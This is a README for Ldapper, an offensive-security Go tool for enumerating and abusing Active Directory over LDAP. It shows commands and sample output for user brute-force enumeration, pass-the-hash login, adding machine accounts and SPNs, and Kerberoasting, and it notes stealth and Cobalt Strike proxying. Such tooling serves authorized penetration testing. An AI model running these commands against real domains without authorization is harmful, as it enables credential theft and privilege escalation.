<p align="center">
    <img src="images/ldapper.png" alt="LDAPPER" width="300">
</p>

# Ldapper

A GoLang tool to enumerate and abuse LDAP. Made _simple_.

Ldapper was created with for use in offensive security engagements for user enumeration, group enumeration, and more. Ldapper uses familiar "net" commands such as "net user" and "net group" to perform all its queries and its output follows the same conventions. Ldapper's user interface operates as a pseudo-interactive shell, where the user can input commands until exited. All traffic goes over the LDAP(S) protocol with a singular bind to help you better blend into the network.

Ldapper is proxy aware and supports NTLM authentication with a user's hash. Additionally, this tool can perform modification actions within LDAP. More functionality is planned for later releases, but for now additional supported command functions are:

- Add Domain Computers
- Add/Remove Arbitrary SPNs
- Kerberoast

This tool should be considered in its beta stages. Please report any bugs, issues, or functionality ideas for future releases.

## Table of Contents

- [Ldapper](#ldapper)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Help](#help)
- [LDAPS Support](#ldaps-support)
- [Authentication](#authentication)
  - [Password](#password)
  - [NTLM](#ntlm)
  - [Kerberos](#kerberos)
- [Query Modules](#query-modules)
  - [Net](#net)
  - [Groups](#groups)
  - [GetUserSPNs](#getuserspns)
  - [Machine Account Quota](#machine-account-quota)
  - [Password Policy](#password-policy)
  - [Enumerate DACL](#enumerate-dacl)
  - [User Enumeration](#user-enumeration)
- [Command Modules](#command-modules)
  - [Add Computer](#add-computer)
  - [Add SPN](#add-spn)
  - [Kerberoast](#kerberoast)
- [Logging](#logging)
- [Proxy Support](#proxy-support)
- [Special Thanks](#special-thanks)

## Installation

Ldapper can be built and ran using the following commands inside of the repository folder:

```
$ go mod tidy             - pull down all necessary dependencies
$ go build                - build Ldapper
$ ./ldapper               - run Ldapper
```

## Help

```
$ ./ldapper
 __    ____   __   ____  ____  ____  ____  
(  )  (    \ / _\ (  _ \(  _ \(  __)(  _ \ 
/ (_/\ ) D (/    \ ) __/ ) __/ ) _)  )   / 
\____/(____/\_/\_/(__)  (__)  (____)(__\_) 
                          @SpaceManMitch96
                                @Synzack21
                                  @mfdooom

Usage of ./ldapper:
  -H string
        Use NTLM authentication
  -b string
        Brute force users from a file. Use -t to specify number of threads.
  -dc string
        IP address or FQDN of target DC
  -h    Display help menu
  -k    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME)
  -o string
        Log file
  -p string
        Password
  -s    Bind using LDAPS
  -socks4 string
        SOCKS4 Proxy Address (ip:port)
  -socks4a string
        SOCKS4A Proxy Address (ip:port)
  -socks5 string
        SOCKS5 Proxy Address (ip:port)
  -t int
        Number of threads to use. Only used for user enumeration. (default 4)
  -u string
        Username (username@domain)
Examples:
        With Password:  ./ldapper -u <username@domain> -p <password> -dc <ip/FQDN> -s
        With Hash:      ./ldapper -u <username@domain> -H <hash> -dc <ip/FQDN> -s
        With Kerberos:  ./ldapper -u <username@domain> -k -dc <ip/FQDN> -s
        User Enum:      ./ldapper -b <wordlist> -dc <ip/FQDN> -s -t <threads>
```

# LDAPS Support

Ldapper supports the ability to bind to LDAP using either unencrypted LDAP on port 389 (default) or encrypted LDAPS on port 636 with the flag `-s`. Some of the command modules, such as adding a domain computer require using LDAPS. LDAPS is always recommended for OPSEC purposes.

# Authentication

## Password

Ldapper can be used with a username and password. This is the most common method of authentication. The username format follows the below covention:

```
$ ./ldapper -u 'hanzo@overwatch.local' -P "Password123!" -dc 10.10.10.101 -s
```

## NTLM

Ldapper can also authenticate with a user's NTLM hash. This method can be used with the `-H` flag.

```
$ ./ldapper -u 'hanzo@overwatch.local' -H OOGNKVJB2TRCYLD26H4DVPF3KBP0SG03 -dc 10.10.10.101 -s
```

## Kerberos

Ldapper can also authenticate using a CCache file specefied in the KRB5CCNAME enviroment variable with the `-k` flag.

```
$ ./ldapper -u 'hanzo@overwatch.local' -k -dc 10.10.10.101 -s
```

# Query Modules

## Net

The net module follows the same structure as the traditional Windows net module. Currently the following commands are supported:

- `net user <user>`
- `net group <group>`
- `net nestedGroups <group>`

The command `net user` will information on a specified user in the domain, minus group memberships (see "[Groups](#groups)" module). The command `net group` will return a list of users that are members of the specified group. The `net nestedGroups` query acts similarly to the "net group" query, but searches recursively for all nested users and groups.

<sub>\*Note that the output in the "group" queries will return the "(Group)" label to distinguish users and groups. This is not part of the group name. Additionally, any groups with spaces in them will be wrapped in single quotes.</sub>

```
> net user hanzo

User Information - hanzo:
-------------------------------------------------------------------------------
User Name:              hanzo
Full Name:              Hanzo Shimada
Comment:                Test Description
User Account Control:   Enabled, Password Doesn't Expire
                        (If Enabled, Check Last Lockout Time)

Last Lockout Time:
Account Expires:        Never
Password Last Set:      02/21/2021 03:33:12 PM
Home Directory:         C:\Users\Home\Hanzo
Last logon:             07/06/2022 03:40:39 PM
Mail:                   hanzo@overwatch.local
```

```
> net group domain admins

Primary Group Members
-------------------------------------------------------------------------------
NestedHighPriv (Group)   jkaplan                  SQLService
Key Admins (Group)       Administrator
```

```
> net nestedGroups domain admins

Primary Group Members
-------------------------------------------------------------------------------
CLAUDINE_CARSON          MERRILL_HODGES           JESSIE_MAXWELL
NestedHighPriv (Group)   jkaplan                  SQLService
Key Admins (Group)       Administrator

Nested Group Members
-------------------------------------------------------------------------------
pharah                   NestedDA                 DoubleNested (Group)
DoubleNestedDA           RANDOLPH_WISE            HORACE_MONTGOMERY
DELMAR_MERRILL           THURMAN_HENDRICKS        SILAS_PRUITT
NORMAND_MULLINS          DORIS_PICKETT            NEWTON_HALL
DEMETRIUS_BRENNAN        MADELINE_SINGLETON       SHERRY_RIVAS
```

<sub>\* Note: nested group queries will likely result in an [expensive LDAP query](http://directoryadmin.blogspot.com/2019/10/hunting-bad-ldap-queries-on-your-dc.html), these are LDAP searches that visit a large number of entries. The default threshold for an expensive search is 10,000 entries.</sub>

## Groups

The `groups` module pulls the group memberships for an individual user. The syntax is as follows:

- `groups <targetUser>`

```
> groups hanzo

Group Memberships - hanzo:
-------------------------------------------------------------------------------
GA-gor-distlist1              BE-1415ACUAT-distlist1        TestGroup2
TestGroup
```

## GetUserSPNs

The `getspns` module pulls all domain users with an SPN set. Syntax is as follows:

- `getspns`

```
> getspns

SPN                     Username                PasswordLastSet                 LastLogon                       Delegation
CIFS/AZRWAPPS1000002    LIDIA_ELLIOTT           2022-07-24 21:07:52 -0400 EDT   2022-07-24 21:08:17 -0400 EDT   unconstrained
CIFS/AZRWLPT1000000     HOUSTON_MCBRIDE         2022-07-24 21:05:43 -0400 EDT   2022-07-24 21:06:15 -0400 EDT   constrained
CIFS/ESMWLPT1000000     DOLLY_MCLEAN            2022-07-15 00:38:54 -0400 EDT   <never>

```

## Machine Account Quota

This module queries for the machine account quota of the domain. Syntax is as follows:

- `mquota`

```
> mquota
Machine Account Quota: 10
```

## Password Policy

This module queries for the password policy for the domain. Syntax is as follows:

- `passpol`

```
> passpol

Minimum Password Length:        8
Password History Length:        24
Lockout Threshold:              5
Lockout Duration:               30      minutes
Minimum Password Age:           1       day(s)
Maximum Password Age:           42      day(s)

Password Complexity:            DOMAIN_PASSWORD_COMPLEX
```

## Enumerate DACL

This module queries for abusable ACES within a target object's DACL. Syntax is as follows:

-`dacl <target object>`

```
> dacl administrator

GENERIC_ALL:
	System (Local System)

GENERIC_WRITE:
	Domain Admins
	Enterprise Admins
	Administrators
	System (Local System)

WRITE_OWNER:
	Domain Admins
	Enterprise Admins
	Administrators
	System (Local System)

WRITE_DACL:
	Domain Admins
	Enterprise Admins
	Administrators
	System (Local System)

FORCE_CHANGE_PASSWORD:

ADD_MEMBER:

```

## User Enumeration

Ldapper also can brute force user enumeration through unauthenticated LDAP querries. Found users can also be exported to a file for further enumeration or testing.

```
$ ./ldapper -b users.txt -dc 10.10.10.101 -s -t 10 -o FoundUsers.txt
 __    ____   __   ____  ____  ____  ____
(  )  (    \ / _\ (  _ \(  _ \(  __)(  _ \
/ (_/\ ) D (/    \ ) __/ ) __/ ) _)  )   /
\____/(____/\_/\_/(__)  (__)  (____)(__\_)
                          @SpaceManMitch96
                                @Synzack21
                                  @mfdooom

[+] Found user: hanzo
[+] Found user: tracer
[+] Found user: sombra
[+] Found user: Administrator

$ cat FoundUsers.txt
hanzo
tracer
sombra
Administrator
```

# Command Modules

## Add Computer

This module allows a user with the appropriate permissions to add a domain computer account to LDAP with a randomized 15 character alphanumeric password. This can be paired with the default machine account quota of 10, where any user can add up to 10 machine accounts.

```
> addComputer ldapper$
Successfully created computer account "ldapper$" with password "mT4lyPn6fh3T8XH"
```

## Add SPN

This module allows the addition of an arbitrary SPN to the target user. This requires write permissions over the target user account. Syntax is as follows:

- `spn add <targetUser> <spn value>`
- `spn delete <targetUser> <spn value>`

```
> spn add hanzo blah/blah
Successfully added SPN: "blah/blah" for user "hanzo"
```

```
> spn delete hanzo blah/blah
Successfully deleted SPN: "blah/blah" for user "hanzo"
```

## Kerberoast

The `roast` module will request and print the service ticket encrypted with the users password. Syntax is as follows:

- `roast <user>`

```
> roast LIDIA_ELLIOT

$krb5tgs$23$*LIDIA_ELLIOT$RANGE.COM$LIDIA_ELLIOT*$31d99685e614b96bb9fab3a534f3a68d$8cfae8a06c390b037bc6c1e4200de88e2d4320b189c8e58dbfb3579b96db0b6afc6645c082d3067e9ba07259cc23f3b02e8c28e02cb90ae29edeedb91c7f02e7a7700d82dc0a0a69081357e37d0db75a224d5f6b4ac61f1bad707eac16c83dae44e0d85e941e90205d7d38f374cd6796b9733bc9e2d27a8588312cb08b0323c40a221b2204eb4eb1af75111ce8b75aa5ebb0b765e1a28f6103a54f2e72b8b6cebb73c0997cc2de4285f462e5d91d608ef628fee624e490e17441bb5b8d9a96e1680d92f151aa12296c3e4370b1ce6a1209b56b7ca1ee52022442db642595db9474c76169e2be5fd4d2e5af13caa61958e8466ac2c021a9ea61ca1857c4463ccfdd65eec6eef3f06c12178703d467e76246f3b6ae5f3248e93d4e58b8ce320a1f25e0bfa683ac014c047105d5030f2d1caea9243bd0ded2009ae6e79122e38e49a81747a93f98ba2557671d48da09fa6475e3d4373dee80f705a482aded93abeab77b337c47d904292dc0f08c89fcb009dd09e101a8a71c3060d9ebc2620b331454e971d51fa9fdab9b8b7f42cb606ac0ca6a85852912ba91266c9e1fcaf33b6cef49fccd490526509955dc5bf6744c9787271819e86f8cb18a999a85c37503d837b10a434ab1ae717f82fc139ba60989b70934a3a6eb62a2ad7dc3af7b70e120b45233059c4606227adc11a86be8cd688b7a2984a782c723f4fb018e6e068e3667a697c6bb761f1cc90cdee0ed51fd2904c89766105976e1ef2d33714f31dbd71ae2a56d674d9998196c160b8847236e77997ebff66d6bf8605c59d04949e1e16b6f60429db005f83bd8719a6e952dc56166d681053a7b7e1461cc3d6b408a21ee6cbe907adacc7650df0e5188d4e1279516f934e97e295e6501dfb20462e0d59edf42a391f7dbf39dcc791bc97c7d77bf66146df570cfccdd92694581232a823ba0174045f4b37343ceb888641c5ccf3f6e10e35957d07974f39fd7b0c5018eb5707f4556b1f73a47c0e081ecdca708d5da866cdaf8ca7131ff0fd9a6a58db6073918368bdc8b2635e3ee2e016136e2cea53fd1f717dd0a86dfdc050f6e46bbd2913c3df5f98fd54784bcee5d74ad8728d8dd1758a5034a326b6b28a2fc1e159e3fe4c0311af57d67c58099932b452921224c1d957626e1603bcd2bc77c8fce394dc0026f289398c9191092075f598055f3b2aeaef83b0b09f55a97bce331c5e4e2904bafbd84bb62d2bfcf9d817f29fe0c67c9bbae7c081c6ea22a20edac1db8588f9a42b636c59f7f6388d5607b243ed873fee7bff9f839c892bf7685fdb9f8fabd90fa3bfa14d13d8c4cc0dcf8865917ea1c4df3634922714bdca305ae6e3c87c34e2b949af7cf3cecd7b4545332088084dcdd3c221a9d75497fdca897

```

\*Note: This does not use the LDAP(S) protocol.

# Logging

Currently, Ldapper supports logging of stdout to a specified log file. This can be called using the `-o` flag. The log file will be created in the current directory. If the log file already exists, it will be appended to.

```
$ ./ldapper -u hanzo@overwatch.local -P "Password123!" -dc 10.10.10.101 -s -o ldapper.log
```

# Proxy Support

Ldapper supports all SOCKS4, SOCKS4A, and SOCKS5 proxies. The proxy can be specified with the `-socks4`, `-socks4a`, and `-socks5` flags respectively. Proxy functionality is compatible with C2 frameworks such as Cobalt Strike.

```
$ ./ldapper -u hanzo@overwatch.local -P "Password123!" -dc 10.10.10.101 -socks4 127.0.0.1:6666 -s
 __    ____   __   ____  ____  ____  ____
(  )  (    \ / _\ (  _ \(  _ \(  __)(  _ \
/ (_/\ ) D (/    \ ) __/ ) __/ ) _)  )   /
\____/(____/\_/\_/(__)  (__)  (____)(__\_)
                          @SpaceManMitch96
                                @Synzack21
                                  @mfdooom

Connecting with proxy: 127.0.0.1:6666

Bind successful, dropping into shell.

>
```

# Special Thanks

Special thanks to [Lars Karlslund](https://github.com/lkarlslund) for his work on [LDAP Nom Nom](https://github.com/lkarlslund/ldapnomnom) which was used as inspiration to build out the [User Enumeration](#user-enumeration) functionality.